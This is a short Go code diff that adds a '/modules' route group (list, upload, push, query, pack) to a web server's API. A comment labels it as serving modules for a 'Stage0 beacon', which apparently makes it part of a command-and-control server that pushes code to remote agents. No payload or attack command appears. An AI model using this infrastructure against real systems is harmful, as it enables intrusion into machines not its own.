@@ -125,6 +125,16 @@ func main() {
 			plugins.GET("/result/:task_id", controllers.HandleGetPluginResult)
 		}
 
+		// L2 modules for Stage0 beacon (CKMS pack + push)
+		modules := api.Group("/modules")
+		{
+			modules.GET("", controllers.HandleListModules)
+			modules.POST("/upload", controllers.HandleUploadModule)
+			modules.POST("/push", controllers.HandlePushModule)
+			modules.POST("/query", controllers.HandleQueryAgentModules)
+			modules.GET("/pack/:id", controllers.HandlePackModule)
+		}
+
 		api.GET("/build/logs/:task_id", controllers.HandleBuildLogsWS)
 
 		transfer := api.Group("/transfer")
